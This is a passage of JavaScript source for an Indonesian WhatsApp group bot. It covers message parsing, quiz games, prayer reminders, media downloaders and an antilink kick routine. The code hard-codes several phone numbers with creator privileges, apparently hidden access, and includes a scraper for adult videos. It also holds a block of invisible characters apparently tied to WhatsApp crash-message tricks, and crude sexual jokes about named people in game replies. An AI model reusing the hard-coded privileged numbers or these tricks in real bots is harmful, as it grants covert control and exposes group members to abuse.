// BASE CREATE BY Ruztan
// di teruskan oleh dits yg paling ganteng 
// di jual awas lu😡
require("../setting/settings")
const antilink = JSON.parse(fs.readFileSync('./all/database/antilink.json'))
let mute = JSON.parse(fs.readFileSync('./all/database/mute.json'));
const premium = JSON.parse(fs.readFileSync("./all/database/premium.json"))
const antilink2 = JSON.parse(fs.readFileSync('./all/database/antilink2.json'))
const antistiker = JSON.parse(fs.readFileSync('./all/database/antistiker.json'))
const welcome = JSON.parse(fs.readFileSync('./all/database/welcome.json'))
const reseller = JSON.parse(fs.readFileSync("./all/database/reseller.json"))
const newowner = JSON.parse(fs.readFileSync('./all/database/owner.json'))
module.exports = async (cay, m, store) => {
try {
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''

//========= CONFIGURASI ==========//
const budy = (typeof m.text == 'string' ? m.text : '')
const JsConfuser = require('js-confuser');
const isOwner = m.sender == owner+"@s.whatsapp.net" ? true : m.fromMe ? true : false
const isReseller = reseller.includes(m.sender)
const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '.' // di string '' kasih '.' sebelumnya, guna untuk hanya owner yang tidak mengenakan prefix dan pengguna lain menggunakan prefix titik
const from = m.key.remoteJid
const isCmd = body.startsWith(prefix)
/*const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""*/
const command = isOwner ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : isCmd ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : '';
const cmd = prefix + command
const args = body.trim().split(/ +/).slice(1)
var crypto = require("crypto")
let { randomBytes } = require("crypto")
const { Client } = require('ssh2');
const fsx = require("fs-extra")
const { youtube } = require("btch-downloader");
const jam = moment.tz('Asia/Makassar').format('HH:mm:ss')
const LINODE_API_TOKEN = global.apilinode;
const API_TOKEN = global.apitokendo;
const makeid = randomBytes(3).toString('hex')
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const text = q = args.join(" ")
const botNumber = await cay.decodeJid(cay.user.id)
const isGroup = m.chat.endsWith('@g.us')
const senderNumber = m.sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const froms = m.quoted ? m.quoted.sender : text ? (text.replace(/[^0-9]/g, '') ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : false) : false;
/*const participants = m.isGroup ? await groupMetadata.participants : ''*/
const isMute= mute.includes(m.chat) ? true : false
// mute gc
const isPremium = [botNumber, ...premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const sender = m.key.fromMe ? (cay.user.id.split(':')[0]+'@s.whatsapp.net' || cay.user.id) : (m.key.participant || m.key.remoteJid)
const groupMetadata = m.isGroup ? await cay.groupMetadata(m.chat).catch(e => {}) : {}

let participant_bot = m.isGroup ? groupMetadata?.participants.find((v) => v.id == botNumber) : {}
let participant_sender = m.isGroup ? groupMetadata?.participants.find((v) => v.id == m.sender) : {}
/*const participants = m.isGroup ? await groupMetadata.participants : ''*/
//pler
const nomore = m.sender.replace(/[^0-9]/g, '')

const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const ments = (teks) => {return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : [sender]}
//batas pler
const tag = `@${m.sender.split('@')[0]}`
const taggc = `@${from.split('@')[0]}`
    //DECRYPT
    async function Decrypt(query) {
      const deobfuscatedCode = new Deobfuscator();
      return (deobfuscatedCode.deobfuscateSource(query));
    }

//pler
const isBotAdmin = participant_bot?.admin !== null ? true : false
const isAdmin = participant_sender?.admin !== null ? true : false
const isCreator = ["2349072958046", "2349151864541", "2348083569647", "2349031616504", botNumber,...premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
/*const { addSaldo, minSaldo, cekSaldo, cekKoinPerak } = require("./database/deposit")
let db_saldo = JSON.parse(fs.readFileSync("./database/saldo.json"));
function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}*/
const { runtime, getRandom, getTime, tanggal, toRupiah, telegraPh, ucapan, generateProfilePicture, getBuffer, fetchJson, resize } = require('../all/function.js')
const { ssweb, igstalk, tts, mediafire, ytmp3 } = require("../scrape/screaper.js")
const { remini } = require('../scrape/remini.js')
const { toAudio, toPTT, toVideo, ffmpeg } = require("../all/converter.js")
const b = fs.readFileSync("./media/menuawal.mp3")
const imagee = fs.readFileSync("./media/hutao1.jpg")
//const isPremium = premium.includes(m.sender)*/
// FUNCTION SALDO & DATA

// BATAS SALDO
//database
//const AntiSpam = db.data.antispam
// DATABASE GLOBAL USER
/*const users = global.database.users
const listall = global.db.listall
const chats = global.db.chats
const stickercmd = global.db.stickercmd
const AntiSpam = global.db.antispam
const spammer = []*/
/////////////////////////////////////////////////////////////////////////
// DETEKSI MEDIA
const isImage = (m.type === 'imageMessage')
const isVideo = (m.type === 'videoMessage')
const isSticker = (m.type == 'stickerMessage')
const isAudio = (m.type == 'audioMessage')
const isViewOnce = (m.type == 'viewOnceMessage')
const isText = (m.type === 'conversation' || m.type === 'extendedTextMessage')
const isQuotedImage = m.type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedVideo = m.type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = m.type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedAudio = m.type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedViewOnce = m.message.extendedTextMessage?.contextInfo?.quotedMessage?.viewOnceMessageV2 ? true : false;
/*const mime = (quoted.msg || quoted).mimetype || quoted.mediaType || "";*/
const isMedia = /image|video|sticker|audio/.test(mime)
const isImagee = /image/.test(mime)
const isVideoo = /video/.test(mime)
const isStickerr =  /|sticker|/.test(mime)
const isAudioo = /audio/.test(mime)
//btas
const { Deobfuscator } = require("deobfuscator");
const onlyGroup = async() => {
let joinbang = `hallo ${tag}, untuk menggunakan semua fitur *bot hutao*, harap masukan bot ke group anda terlebih dahulu agar anda dapat akses lebih di dalam group gratis tanpa prabayar\n\nAtau anda bisa membeli akses sewa & premium dari owner\n\natau masuk grup kami kak${global.group}`
m.reply(joinbang)}

const onlyGc = async() => {reply(global.msg.group)};
async function tiktok2(query) {
  return new Promise(async (resolve, reject) => {
    try {
    const encodedParams = new URLSearchParams();
encodedParams.set('url', query);
encodedParams.set('hd', '1');
      const response = await axios({
        method: 'POST',
        url: 'https://tikwm.com/api/',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Cookie': 'current_language=en',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
        },
        data: encodedParams
      });
      const videos = response.data.data;
        const result = {
          title: videos.title,
          cover: videos.cover,
          origin_cover: videos.origin_cover,
          no_watermark: videos.play,
          watermark: videos.wmplay,
          music: videos.music
        };
        resolve(result);
    } catch (error) {
      reject(error);
    }
  });
}
async function tiktokSearchVideo(query) {
	return new Promise(async (resolve, reject) => {
		axios("https://tikwm.com/api/feed/search", {
			headers: {
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'X-Requested-With': 'XMLHttpRequest',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
                'Referer': 'https://www.tikwm.com/'
            },
			data: {
				keywords: query,
				count: 12,
				cursor: 0,
				web: 1,
				hd: 1,
			},
			method: "POST",
		}).then((res) => {
			resolve(res.data.data);
		});
	});
}
async function hentaivid() {
			return new Promise((resolve, reject) => {
				const page = Math.floor(Math.random() * 1153)
				axios.get('https://sfmcompile.club/page/' + page).then((data) => {
					const $ = cheerio.load(data.data)
					const hasil = []
					$('#primary > div > div > ul > li > article').each(function (a, b) {
						hasil.push({
							title: $(b).find('header > h2').text(),
							link: $(b).find('header > h2 > a').attr('href'),
							category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
							share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
							views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
							type: $(b).find('source').attr('type') || 'image/jpeg',
							video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
							video_2: $(b).find('video > a').attr('href') || ''
						})
					})
					resolve(hasil)
				})
			})
		}
async function uploadToCatbox(filePath) {
            const form = new FormData();
            form.append('fileToUpload', fs.createReadStream(filePath)); // file yang diupload
            form.append('reqtype', 'fileupload'); // reqtype harus "fileupload"
          
            try {
              const response = await axios.post('https://catbox.moe/user/api.php', form, {
                headers: {
                  ...form.getHeaders(),
                },
              });
          
              if (response.data) {
                // Ambil hanya nama file yang diunggah
                const filename = response.data.trim();
                return `${filename}`;
              } else {
                throw new Error('Gagal mendapatkan URL dari Catbox.');
              }
            } catch (error) {
              console.error('Error uploading to Catbox:', error.message);
              throw error;
            }
          }
//=========== MESSAGE ===========//
/*if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(namaowner), color(`[ PESAN ]`, `cyan`), color(`\nFROM`, `blue`), color(`${senderNumber}`, `cyan`), color(`Text :`, `blue`), color(`🗣️ ${cmd}`, `white`))
}*/
if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(namaowner), color(`[ PESAN ]`, `cyan`), chalk.yellow.bgCyan.bold(`\n乂 FROM`, `blue`), color(`${senderNumber}`, `cyan`), chalk.yellow.bgCyan.bold(`\n乂 TEXT :`), color(`🗣️ ${cmd}`, `cyan`), chalk.yellow.bgCyan.bold(`\n乂 WAKTU :`), color(`${jam}`, `cyan`), color(`\n---------------------------`, `green`))
}

cay.autoshalat = cay.autoshalat ? cay.autoshalat : {}
    let id = m.chat
    if (id in cay.autoshalat) {
    return false
    }
    let jadwalSholat = {
    shubuh: '04:29',
    terbit: '05:44',
    dhuha: '06:02',
    dzuhur: '12:02',
    ashar: '15:15',
    magrib: '17:52',
    isya: '19:01',
    }
    const datek = new Date((new Date).toLocaleString("en-US", {
    timeZone: "Asia/Jakarta"
    }));
    const hours = datek.getHours();
    const minutes = datek.getMinutes();
    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
    for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if (timeNow === waktu) {
        cay.autoshalat[id] = [
            cay.sendMessage(m.chat, {
audio: {
    url: 'https://media.vocaroo.com/mp3/1ofLT2YUJAjQ'
},
mimetype: 'audio/mp4',
ptt: true,
contextInfo: {
    externalAdReply: {
        showAdAttribution: true,
        mediaType: 1,
        mediaUrl: '',
        title: `Selamat menunaikan Ibadah Sholat ${sholat}`,
        body: `🕑 ${waktu}`,
        sourceUrl: '',
        thumbnail: await fs.readFileSync('./media/jadwal.jpg'),
        renderLargerThumbnail: true
    }
}
            }, {}),
            setTimeout(async () => {
delete cay.autoshalat[m.chat]
            }, 57000)
        ]
    }
    }
    //auto typing 
/*if (!m.key.fromMe && global.autoTyping){

const readkey = {

remoteJid: m.chat,

id: m.key.id, 

participant: m.isGroup ? m.key.participant : undefined 

}*/
// FUNCTION SUIT PVP POLLING 
/*let roof = Object.values(suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(sender))
if (roof) {
let win = ''
let tie = false
if (sender == roof.p2 && /^(acc(ept)?|y|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(body) && m.isGroup && roof.status == 'wait') {
if (/^(gamau|nanti|ga(k.)?bisa)/i.test(body)) {
//minSaldo(m.sender, 1000, db_saldo)
pokl = `@${roof.p2.split('@')[0]} menolak suit, suit dibatalkan\nDan player dikenakan sanksi -1000 balance karna menolak ajakan pemain`
await cay.sendteks(from, pokl, m)
delete suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = from
clearTimeout(roof.waktu)

teksbbb = `AYO PILIH SUIT MU`
ggy = `suit telah dikirimkan ke chat

@${roof.p.split('@')[0]} dan @${roof.p2.split('@')[0]}

Silahkan pilih suit di chat masing"
klik wa.me/${botNumber.split('@')[0]}`
await cay.sendteks(from, ggy, fkontak)
if (!roof.pilih) await cay.sendPoll(roof.p, teksbbb, [`batu`,`kertas`,`gunting`, ])
if (!roof.pilih2) await cay.sendPoll(roof.p2, teksbbb, [`batu`,`kertas`,`gunting`, ])
roof.waktu_milih = setTimeout(async() => {
if (!roof.pilih && !roof.pilih2) await cay.sendMessage(from, {text: `Kedua pemain tidak niat main,\nSuit dibatalkan`})
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
//minSaldo(m.sender, 1000, db_saldo)
sffp = `@${(roof.pilih ? roof.p2 : roof.p).split('@')[0]} tidak memilih suit, game berakhir\n`
await m.reply(sffp)
}
delete suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = sender == roof.p
let jwb2 = sender == roof.p2
let g = /.gunting/i
let b = /.batu/i
let k = /.kertas/i
let reg = /^(.gunting|.batu|.kertas)/i
if (jwb && reg.test(body) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(body.toLowerCase())[0]
roof.text = body
await cay.sendMessage(from, {text: `Kamu telah memilih ${body} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`}, {quoted:fkontak})
if (!roof.pilih2) await cay.sendMessage(roof.p2, {text: '_Lawan sudah memilih_\nSekarang giliran kamu'})
}
if (jwb2 && reg.test(body) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(body.toLowerCase())[0]
roof.text2 = body

tyu = `Kamu telah memilih ${body} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`
await cay.sendMessage(from, {text: tyu}, {quoted:m})

if (!roof.pilih) await cay.sendMessage(roof.p, {text: '_Lawan sudah memilih_\nSekarang giliran kamu'})
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
await cay.sendteks(roof.asal, `${tie ? '*HASIL SERI*\n\n' : ''}@${roof.p.split('@')[0]} *${roof.text}* ${tie ? '' : roof.p == win ? ' Menang' : ' Kalah'}\n@${roof.p2.split('@')[0]} *${roof.text2}* ${tie ? '' : roof.p2 == win ? ' Menang' : ' Kalah'}${tie ? '' : '\n\nHadiah Saldo : 2,000 '}`, f1('HASIL SUIT PVP', null))
//if (roof.p == win) {
//roof.p == win ? //minSaldo(users[roof.p], 2000, db_saldo) : minSaldo(users[roof.p], 1000, db_saldo)
// (roof.p2 == win) 
//roof.p2 == win ? //addSaldo(users[roof.p2], 2000, db_saldo) : minSaldo(users[roof.p2], 1000, db_saldo)

//delete suit[roof.id]
*/
    //==========================================================//
    const penangkalnya = `
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌
᠌`

    function pickRandom(list) {
      return list[Math.floor(Math.random() * list.length)]
    }
    
    //game
    if ((from in tebakgambar)) {
let { soal, jawaban, hadiah, waktu } = tebakgambar[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${tebakgambar[from].jawaban}*`);
delete tebakgambar[from]
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*`);
cay.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})
//addSaldo(m.sender, 150, db_saldo)
clearTimeout(waktu);
delete tebakgambar[from];
} else cay.sendMessage(sender, {react: {text: '❌', key: m.key}})
}
// GAME TEBAK ANIME 
if ((from in tebakanime)) {
let { soal, jawaban, hadiah, waktu } = tebakanime[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete tebakanime[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah dapet pap titit risky/agus`);
//addSaldo(m.sender, 200, db_saldo)
cay.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})

clearTimeout(waktu);
delete tebakanime[from];
} else cay.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME TEBAK LAGU 
if ((from in tebaklagu)) {
let { soal, jawaban, hadiah, waktu } = tebaklagu[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete tebaklagu[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah dapet pap titit risky/agus`);
//addSaldo(m.sender, 200, db_saldo)
cay.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})

clearTimeout(waktu);
delete tebaklagu[from];
} else cay.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME KUIS 
if ((from in kuis)) {
let { soal, jawaban, hadiah, waktu } = kuis[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete kuis[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah dapet pap titit risky/agus`);
//addSaldo(m.sender, 200, db_saldo)
cay.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})

clearTimeout(waktu);
delete kuis[from];
} else cay.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME SIAPAKAH AKU 
if ((from in siapakahaku)) {
let { soal, jawaban, hadiah, waktu } = siapakahaku[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete siapakahaku[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah dapet pap titit risky/agus`);
//addSaldo(m.sender, 200, db_saldo)
cay.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})

clearTimeout(waktu);
delete siapakahaku[from];
} else cay.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME TEBAK KALIMAT 
if ((from in tebakkalimat)) {
let { soal, jawaban, hadiah, waktu } = tebakkalimat[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete tebakkalimat[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah dapet pap titit risky/agus`);
//addSaldo(m.sender, 200, db_saldo)
cay.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})
clearTimeout(waktu);
delete tebakkalimat[from];
} else cay.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME TEBAK KATA 
if ((from in tebakkata)) {
let { soal, jawaban, hadiah, waktu } = tebakkata[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete tebakkata[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n\n*Game :* Tebak Kata\n*Hadiah dapet pap titit risky/agus`);
//addSaldo(m.sender, 200, db_saldo)
cay.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})
clearTimeout(waktu);
delete tebakkata[from];
} else await cay.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME TEBAK LIRIK 
if ((from in tebaklirik)) {
let { soal, jawaban, hadiah, waktu } = tebaklirik[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete tebaklirik[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah dapet pap titit risky/agus`);
//addSaldo(m.sender, 200, db_saldo)
cay.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})

clearTimeout(waktu);
delete tebaklirik[from];
} else await cay.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME TEBAK KIMIA 
if ((from in tebakkimia)) {
let { soal, jawaban, hadiah, waktu } = tebakkimia[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete tebakkimia[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah dapet pap titit risky/agus`);
//addSaldo(m.sender, 200, db_saldo)
cay.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})
clearTimeout(waktu);
delete tebakkimia[from];
} else cay.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME TEBAK BENDERA 
if ((from in tebakbendera)) {
let { soal, jawaban, hadiah, waktu } = tebakbendera[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete tebakbendera[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah dapet pap titit risky/agus`);
//addSaldo(m.sender, 200, db_saldo)
cay.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})

clearTimeout(waktu);
delete tebakbendera[from];
} else cay.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME ASAH OTAK 
if ((from in asahotak)) {
let { soal, jawaban, hadiah, waktu } = asahotak[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete asahotak[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah dapet pap titit risky/agus`);
//addSaldo(m.sender, 200, db_saldo)
cay.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})

clearTimeout(waktu);
delete asahotak[from];
} else cay.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME SUSUN KATA 
if ((from in susunkata)) {
let { soal, jawaban, hadiah, waktu } = susunkata[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete susunkata[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah dapet pap titit risky/agus`);
//addSaldo(m.sender, 200, db_saldo)
cay.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})

clearTimeout(waktu);
delete susunkata[from];
} else cay.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME CAK LONTONG 
if ((from in caklontong)) {
let { soal, jawaban, hadiah, waktu } = caklontong[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete caklontong[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah dapet pap titit risky/agus`);
//addSaldo(m.sender, 200, db_saldo)
cay.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})

clearTimeout(waktu);
delete caklontong[from];
} else cay.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME KUIS MATH 
if ((from in kuismath)) {
let { soal, jawaban, hadiah, waktu } = kuismath[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete kuismath[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah dapet pap titit risky/agus`);
//addSaldo(m.sender, 200, db_saldo)
cay.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})

clearTimeout(waktu);
delete kuismath[from];
} else cay.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME FAMILY 100 
if ((from in family100)) {
let { soal, jawaban, hadiah, waktu } = family100[from]
for (let i of jawaban){
if (budy.toLowerCase() == "nyerah") {
await m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 0`);
delete family100[from]
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
let anu = jawaban.indexOf(i)
jawaban.splice(anu, 1)
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban.length < 1 ? 'Selamat semua jawaban sudah tertebak!\ningin bermain lagi? kirim '+prefix+'family100' : 'Jawaban yang belum tertebak: '+jawaban.length}\n*Hadiah dapet pap titit risky/agus`);
//addSaldo(m.sender, 200, db_saldo)
cay.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})
clearTimeout(waktu);
delete family100[from];
} else cay.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}
if (jawaban.length < 1){
clearTimeout(waktu);
delete family100[from];
}
}

    //antilink
if (antilink.includes(m.chat)) {
if (!isBotAdmin) return
if (!isAdmin && !isOwner && !m.fromMe) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text)) {
var gclink = (`https://chat.whatsapp.com/` + await cay.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await cay.sendMessage(m.chat, {text: `@${m.sender.split("@")[0]} Maaf Kamu Akan Saya Keluarkan Dari Grup Ini Karna Admin/Owner Bot Menyalakan Fitur *Antilink* Grup Lain!`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnail: fs.readFileSync("./media/warning.jpg"), title: "｢ LINK GRUP DETECTED ｣", previewType: "PHOTO"}}}, {quoted: m})
await cay.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await cay.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}
}}

if (antilink2.includes(m.chat)) {
if (!isBotAdmin) return
if (!isAdmin && !isOwner && !m.fromMe) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text)) {
var gclink = (`https://chat.whatsapp.com/` + await cay.groupInviteCode(m.chat))
